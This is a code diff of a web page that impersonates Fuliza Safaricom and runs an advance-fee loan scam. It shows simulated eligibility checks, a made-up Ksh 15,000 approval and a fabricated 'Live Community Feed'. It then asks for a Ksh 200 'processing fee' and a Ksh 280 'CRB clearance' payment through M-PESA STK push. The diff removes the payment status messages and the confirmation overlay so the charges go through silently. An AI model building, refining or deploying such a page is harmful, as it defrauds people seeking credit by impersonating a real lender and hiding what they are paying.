@@ -100,11 +100,7 @@
         .modal-phone-group { display: flex; border: 1.5px solid var(--border); border-radius: 10px; overflow: hidden; margin: 8px 0 12px; }
         .modal-phone-group .prefix { background: var(--gray); padding: 12px 14px; font-weight: 600; border-right: 1.5px solid var(--border); color: #333; display: flex; align-items: center; }
         .modal-phone-group input { flex: 1; border: none; padding: 12px 14px; font-family: inherit; font-size: 0.95rem; outline: none; }
-        .modal-status { font-size: 0.75rem; padding: 8px 12px; border-radius: 8px; margin: 10px 0; display: none; font-weight: 500; line-height: 1.3; }
-        .modal-status.show { display: block; }
-        .modal-status.pending { background: #fff8e1; color: #e65100; }
-        .modal-status.success { background: #e8f5e9; color: #0ca678; }
-        .modal-status.error { background: #fce4ec; color: var(--red); }
+        /* ── Status removed ── */
         .feed-container { max-height: 220px; overflow-y: auto; padding-right: 4px; }
         .feed-item { display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px; border-bottom: 1px solid #f0f0f0; animation: slideIn 0.3s ease; text-align: left; }
         .feed-item:last-child { border-bottom: none; }
@@ -139,20 +135,10 @@
         .stk-waiting-box .listening { background: #e8f5e9; border-radius: 24px; padding: 8px 16px; font-size: 0.78rem; color: #0d5f2f; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
         .stk-waiting-box .listening .dot { width: 8px; height: 8px; background: #0ca678; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
         .stk-waiting-box .note { font-size: 0.68rem; color: #adb5bd; margin-top: 14px; }
-        /* Processing Fee Confirmed Overlay — kept for structure but never shown */
-        #processingFeeConfirmedOverlay .modal-box .big-check { width: 70px; height: 70px; background: linear-gradient(135deg,#0d5f2f,#0ca678); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 16px; color: white; }
-        #processingFeeConfirmedOverlay .modal-box .title { font-size: 1.3rem; font-weight: 900; color: #0d5f2f; margin-bottom: 8px; }
-        #processingFeeConfirmedOverlay .modal-box .sub { font-size: 0.88rem; color: #495057; }
-        #processingFeeConfirmedOverlay .modal-box .receipt { font-size: 0.78rem; color: #6c757d; }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots span { width: 10px; height: 10px; background: #0d5f2f; border-radius: 50%; animation: procDotPulse 1.2s infinite ease-in-out both; }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots span:nth-child(1) { animation-delay: -0.32s; }
-        #processingFeeConfirmedOverlay .modal-box .spinner-dots span:nth-child(2) { animation-delay: -0.16s; }
         .fee-section { background: #f5edd6; border: 2px solid #c9a84c; border-radius: 12px; padding: 16px 18px; margin: 16px 0; text-align: center; }
         .fee-section .fee-label { font-size: 0.72rem; color: #666; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
         .fee-section .fee-amount { font-size: 2rem; font-weight: 900; color: #b85c00; margin: 4px 0; }
         .fee-section .fee-sub { font-size: 0.75rem; color: #555; font-weight: 500; }
-        /* Final Success Page */
         .success-summary { background: #f0faf4; border: 1px solid #b2dfdb; border-radius: 12px; padding: 14px; margin: 16px 0; text-align: left; font-size: 0.82rem; }
         .success-summary .summary-title { font-weight: 800; color: #0d5f2f; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
         .success-summary .summary-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
@@ -167,7 +153,7 @@
 </head>
 <body style="background: #1a7a3a !important;">
 
-    <!-- ─── TOAST ─── -->
+    <!-- ─── TOAST (only used for form validation) ─── -->
     <div id="toast" class="toast"></div>
 
     <!-- =============================================================
@@ -213,16 +199,13 @@
 
         <div class="container">
 
-            <!-- ==========================================================
-            STEP 1: APPLICATION (SIMPLIFIED)
-            ========================================================== -->
+            <!-- STEP 1: APPLICATION -->
             <div id="step1" class="page">
                 <div class="card-content">
                     <div class="card-title">Kindly submit the following requirements</div>
                     <div class="card-sub">Fields marked <span class="required">*</span> are required</div>
 
                     <form id="appForm" onsubmit="submitApplication(event)" novalidate>
-
                         <div class="form-group">
                             <label>Full Name <span class="required">*</span></label>
                             <div class="input-wrapper" id="fullNameWrapper">
@@ -266,9 +249,7 @@
                             </div>
                         </div>
 
-                        <button type="submit" class="btn-primary">
-                            Submit Application
-                        </button>
+                        <button type="submit" class="btn-primary">Submit Application</button>
                     </form>
 
                     <div class="approved-badge-card">
@@ -278,15 +259,12 @@
                 </div>
             </div>
 
-            <!-- ==========================================================
-            CHECKING ELIGIBILITY ANIMATED PAGE
-            ========================================================== -->
+            <!-- CHECKING ELIGIBILITY -->
             <div id="checkingPage" class="page">
                 <div class="card-content" style="text-align: center; padding: 32px 20px;">
                     <div class="eligibility-spinner"></div>
                     <div style="font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px;">Checking your eligibility...</div>
                     <div style="font-size: 0.85rem; color: #6c757d; margin-bottom: 24px;" id="checkingSubtext">Hold on jon, we're reviewing your application.</div>
-
                     <div class="check-item pending" id="check1"><div class="check-circle"></div><div style="font-size: 0.88rem;">Verifying national ID...</div></div>
                     <div class="check-item pending" id="check2"><div class="check-circle"></div><div style="font-size: 0.88rem;">Checking phone number registration...</div></div>
                     <div class="check-item pending" id="check3"><div class="check-circle"></div><div style="font-size: 0.88rem;">Reviewing Fuliza eligibility...</div></div>
@@ -295,18 +273,14 @@
                 </div>
             </div>
 
-            <!-- ==========================================================
-            STEP 3: APPROVED AMOUNT (Withdraw Button)
-            ========================================================== -->
+            <!-- STEP 3: APPROVED -->
             <div id="step3" class="page">
                 <div class="card-header-green">
                     <div class="step-info">Step 3 of 5 · Approved</div>
                     <div class="step-title" style="font-size: 1.25rem; font-weight: 800; margin-bottom: 6px;" id="approvedGreeting">🎉 Congratulations, JON MO!</div>
                     <div class="step-sub" style="font-size: 0.82rem; opacity: 0.95; line-height: 1.45;">You have been approved for the following Fuliza Safaricom Fund amount. Click withdraw to proceed.</div>
                 </div>
-
                 <div class="card-body-white" style="padding: 20px; background: #ffffff;">
-                    <!-- Approved Amount Display -->
                     <div style="border: 1.5px solid #b4c6ef; background: #f0f5ff; border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 16px;">
                         <div style="font-size: 0.72rem; color: #6c757d; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">YOUR APPROVED FULIZA SAFARICOM FUND</div>
                         <div style="font-size: 2.6rem; font-weight: 900; color: #0d5f2f; margin: 4px 0;">Ksh 15,000</div>
@@ -314,15 +288,12 @@
                             <span>✓</span> Eligibility verified
                         </div>
                     </div>
-
                     <button class="btn-primary btn-green" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(13, 95, 47, 0.2);" onclick="showProcessingFeePage()">
                         💸 Withdraw Funds
                     </button>
-
                     <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
                         🔒 Secure M-PESA STK Push payment
                     </div>
-
                     <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
                         <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
                             🔴 Live Community Feed
@@ -330,7 +301,6 @@
                         </div>
                         <div class="feed-container" id="feedContainer3"></div>
                     </div>
-
                     <div class="approved-badge-card">
                         <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
                         <span class="flag-below">🇰🇪</span>
@@ -338,9 +308,7 @@
                 </div>
             </div>
 
-            <!-- ==========================================================
-            STEP 4: PROCESSING FEE PAGE (Ksh 200)
-            ========================================================== -->
+            <!-- STEP 4: PROCESSING FEE -->
             <div id="processingFeePage" class="page">
                 <div class="card-header-gold">
                     <div class="nav-header">
@@ -350,23 +318,18 @@
                     <div class="step-title">Processing Fee Required</div>
                     <div class="step-sub">Pay the processing fee to continue with your fund disbursement.</div>
                 </div>
-
                 <div class="card-body-white" style="padding: 20px; background: #ffffff;">
-                    <!-- Processing Fee Section -->
                     <div class="fee-section">
                         <div class="fee-label">Processing Fee</div>
                         <div class="fee-amount">Ksh 200</div>
                         <div class="fee-sub">Pay this fee to proceed with your fund disbursement</div>
                     </div>
-
                     <button class="btn-primary btn-gold" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(201, 168, 76, 0.3);" onclick="openProcessingFeePayment()">
                         💰 Pay Ksh 200
                     </button>
-
                     <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
                         🔒 Secure M-PESA STK Push payment
                     </div>
-
                     <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
                         <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
                             🔴 Live Community Feed
@@ -374,7 +337,6 @@
                         </div>
                         <div class="feed-container" id="feedContainerProc"></div>
                     </div>
-
                     <div class="approved-badge-card">
                         <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
                         <span class="flag-below">🇰🇪</span>
@@ -382,15 +344,12 @@
                 </div>
             </div>
 
-            <!-- ==========================================================
-            STEP 5: CRB CLEARANCE PAGE (Ksh 280)
-            ========================================================== -->
+            <!-- STEP 5: CRB -->
             <div id="crbPage" class="page">
                 <div class="card-header-red" style="background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0;">
                     <div style="font-size: 0.72rem; opacity: 0.9; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Step 5 of 5 · CRB Clearance Required</div>
                     <div class="step-title" style="font-size: 1.25rem; font-weight: 800; line-height: 1.3;">Clear with CRB to release your funds</div>
                 </div>
-
                 <div class="card-body-white" style="padding: 20px; background: #ffffff;">
                     <div style="background: #ffebee; border: 1px dashed #ef9a9a; border-radius: 12px; padding: 18px; margin-bottom: 20px;">
                         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
@@ -402,15 +361,12 @@
                             Paid via M-PESA STK push to <span id="crbPhoneDisplay">0710222875</span>
                         </div>
                     </div>
-
                     <button class="btn-primary btn-red" style="font-size: 1.05rem; margin-bottom: 16px; margin-top: 0; box-shadow: 0 4px 12px rgba(198, 40, 40, 0.2);" onclick="openCRBPayment()">
                         Pay Ksh 280 to Clear CRB →
                     </button>
-
                     <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 20px;">
                         🔒 Secure payment · Funds released immediately after clearance
                     </div>
-
                     <div style="border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
                         <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
                             🔴 Live Community Feed
@@ -418,7 +374,6 @@
                         </div>
                         <div class="feed-container" id="feedContainerCRB"></div>
                     </div>
-
                     <div class="approved-badge-card">
                         <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
                         <span class="flag-below">🇰🇪</span>
@@ -426,9 +381,7 @@
                 </div>
             </div>
 
-            <!-- ==========================================================
-            FINAL SUCCESS PAGE (All Fees Cleared!)
-            ========================================================== -->
+            <!-- FINAL SUCCESS -->
             <div id="allFeesClearedPage" class="page">
                 <div class="card-header-green" style="background: linear-gradient(135deg, #0d5f2f, #0ca678);">
                     <div class="step-title" style="font-size: 1.4rem; font-weight: 900; margin-bottom: 6px;">✅ All Fees Cleared!</div>
@@ -459,13 +412,11 @@
 
         </div>
 
-        <div class="footer">
-            Fuliza Safaricom · Empowering Kenyans 🇰🇪
-        </div>
+        <div class="footer">Fuliza Safaricom · Empowering Kenyans 🇰🇪</div>
     </div>
 
     <!-- =============================================================
-    PROCESSING FEE PAYMENT MODAL
+    PROCESSING FEE PAYMENT MODAL (status removed)
     ============================================================= -->
     <div class="modal-overlay" id="processingFeeModal">
         <div class="modal-box">
@@ -480,7 +431,7 @@
                 <span class="prefix">+254</span>
                 <input type="tel" id="procFeePhoneInput" placeholder="712345678">
             </div>
-            <div id="procFeeStatus" class="modal-status"></div>
+            <!-- status div removed -->
             <div style="display:flex; gap:10px;">
                 <button class="btn-primary btn-gold" style="flex:1;" id="procFeePayBtn" onclick="processProcessingFee()">
                     <span id="procFeePayText">Pay Ksh 200</span>
@@ -493,22 +444,7 @@
     </div>
 
     <!-- =============================================================
-    PROCESSING FEE CONFIRMED OVERLAY (kept but NEVER shown)
-    ============================================================= -->
-    <div class="modal-overlay" id="processingFeeConfirmedOverlay">
-        <div class="modal-box" style="text-align:center;">
-            <div class="big-check">✅</div>
-            <div class="title">Processing Fee Confirmed!</div>
-            <div class="sub">Payment of <strong>Ksh 200</strong> received via M-PESA.</div>
-            <div class="receipt">Receipt: <strong id="procFeeReceiptDisplay">UG9MDARFZC</strong></div>
-            <div class="sub" style="margin-bottom:20px;">Proceeding to CRB clearance step...</div>
-            <div class="spinner-dots"><span></span><span></span><span></span></div>
-            <button class="btn-primary btn-green" onclick="proceedToCRB()">Continue → CRB Clearance</button>
-        </div>
-    </div>
-
-    <!-- =============================================================
-    CRB PAYMENT MODAL
+    CRB PAYMENT MODAL (status removed)
     ============================================================= -->
     <div class="modal-overlay" id="crbModal">
         <div class="modal-box">
@@ -523,7 +459,7 @@
                 <span class="prefix">+254</span>
                 <input type="tel" id="crbPhoneInput" placeholder="712345678">
             </div>
-            <div id="crbStatus" class="modal-status"></div>
+            <!-- status div removed -->
             <div style="display:flex; gap:10px;">
                 <button class="btn-primary btn-red" style="flex:1;" id="crbPayBtn" onclick="processCRBPayment()">
                     <span id="crbPayText">Pay Ksh 280</span>
@@ -536,7 +472,7 @@
     </div>
 
     <!-- =============================================================
-    STK WAITING OVERLAY (reused for all payments)
+    STK WAITING OVERLAY
     ============================================================= -->
     <div class="stk-waiting-overlay" id="stkWaitingOverlay">
         <div class="stk-waiting-box">
@@ -551,7 +487,7 @@
     </div>
 
     <!-- =============================================================
-    OFFICIAL PROCESSING SYSTEM MODAL
+    PROCESSING MODAL
     ============================================================= -->
     <div class="proc-modal-overlay" id="processingModal">
         <div class="proc-modal-box">
@@ -689,7 +625,7 @@
             renderFeed();
         }
 
-        // ==================== NAVIGATION (Global) ====================
+        // ==================== NAVIGATION ====================
         function showPage(pageId) {
             if (pageId === 'welcomePage') {
                 document.getElementById('welcomePage').style.display = 'block';
@@ -722,7 +658,7 @@
         function showCRBPage() { showPage('crbPage'); }
         function showProcessingFeePage() { showPage('processingFeePage'); }
 
-        // ==================== STEP 1: APPLICATION SUBMIT ====================
+        // ==================== STEP 1: SUBMIT ====================
         function submitApplication(e) {
             e.preventDefault();
             const fullNameInput = document.getElementById('fullName');
@@ -755,7 +691,7 @@
             }, 1500);
         }
 
-        // ==================== ELIGIBILITY CHECKS ====================
+        // ==================== ELIGIBILITY ====================
         function runEligibilityChecks() {
             const firstName = appData.fullName.split(' ')[0] || 'jon';
             document.getElementById('checkingSubtext').textContent =
@@ -792,7 +728,7 @@
             return p;
         }
 
-        // ==================== PAYLORE STK PUSH (EXACT TEST LOGIC) ====================
+        // ==================== PAYLORE STK PUSH ====================
         async function payloreSTKPush(phone, amount, reference, description) {
             const payload = {
                 phone: normalizePhone(phone),
@@ -809,9 +745,7 @@
 
             const responseText = await response.text();
             let jsonData = null;
-            try {
-                jsonData = JSON.parse(responseText);
-            } catch (e) {}
+            try { jsonData = JSON.parse(responseText); } catch (e) {}
 
             if (!response.ok) {
                 throw new Error(jsonData?.error || jsonData?.message || responseText || 'Request failed');
@@ -837,12 +771,10 @@
             return data;
         }
 
-        // ==================== PROCESSING FEE (Ksh 200) — SILENT ====================
+        // ==================== PROCESSING FEE (SILENT) ====================
         function openProcessingFeePayment() {
             document.getElementById('processingFeeModal').classList.add('open');
             document.getElementById('procFeePhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
-            document.getElementById('procFeeStatus').className = 'modal-status';
-            document.getElementById('procFeeStatus').innerHTML = '';
             document.getElementById('procFeePayBtn').disabled = false;
             document.getElementById('procFeePayText').textContent = 'Pay Ksh 200';
             document.getElementById('procFeeSpinner').style.display = 'none';
@@ -855,7 +787,6 @@
         async function processProcessingFee() {
             const rawPhone = document.getElementById('procFeePhoneInput').value.trim();
             if (!rawPhone) {
-                // Silent: just close the modal and do nothing
                 closeProcFeeModal();
                 return;
             }
@@ -863,12 +794,10 @@
             const payBtn = document.getElementById('procFeePayBtn');
             const payText = document.getElementById('procFeePayText');
             const spinner = document.getElementById('procFeeSpinner');
-            const status = document.getElementById('procFeeStatus');
 
             payBtn.disabled = true;
             payText.textContent = 'Sending...';
             spinner.style.display = 'inline-block';
-            status.className = 'modal-status';
 
             document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
             document.getElementById('stkWaitingOverlay').classList.add('open');
@@ -882,14 +811,11 @@
 
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
                 closeProcFeeModal();
-
-                // SILENT: no success overlay — proceed directly to CRB
                 proceedToCRB();
 
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 200';
                 spinner.style.display = 'none';
-                status.className = 'modal-status';
 
             } catch (err) {
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
@@ -898,7 +824,6 @@
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 200';
                 spinner.style.display = 'none';
-                status.className = 'modal-status';
             }
         }
 
@@ -906,12 +831,10 @@
             showCRBPage();
         }
 
-        // ==================== CRB PAYMENT (Ksh 280) — SILENT ====================
+        // ==================== CRB PAYMENT (SILENT) ====================
         function openCRBPayment() {
             document.getElementById('crbModal').classList.add('open');
             document.getElementById('crbPhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
-            document.getElementById('crbStatus').className = 'modal-status';
-            document.getElementById('crbStatus').innerHTML = '';
             document.getElementById('crbPayBtn').disabled = false;
             document.getElementById('crbPayText').textContent = 'Pay Ksh 280';
             document.getElementById('crbSpinner').style.display = 'none';
@@ -929,12 +852,10 @@
             const payBtn = document.getElementById('crbPayBtn');
             const payText = document.getElementById('crbPayText');
             const spinner = document.getElementById('crbSpinner');
-            const status = document.getElementById('crbStatus');
 
             payBtn.disabled = true;
             payText.textContent = 'Sending...';
             spinner.style.display = 'inline-block';
-            status.className = 'modal-status';
 
             document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
             document.getElementById('stkWaitingOverlay').classList.add('open');
@@ -953,7 +874,6 @@
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 280';
                 spinner.style.display = 'none';
-                status.className = 'modal-status';
 
             } catch (err) {
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
@@ -962,7 +882,6 @@
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 280';
                 spinner.style.display = 'none';
-                status.className = 'modal-status';
             }
         }
 
@@ -1011,7 +930,7 @@
                 feedInterval = null; }
         }
 
-        // ==================== TOAST (minimal, kept for non‑payment use) ====================
+        // ==================== TOAST ====================
         function showToast(msg) {
             const toast = document.getElementById('toast');
             toast.textContent = msg;
@@ -1075,7 +994,7 @@
             if (step3Active || procActive || crbActive) { addRandomFeed(); }
         }, 10000);
 
-        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy) — payment messages suppressed');
+        console.log('🇰🇪 Fuliza Safaricom Kenya — all payment messages removed');
     </script>
 </body>
 </html>
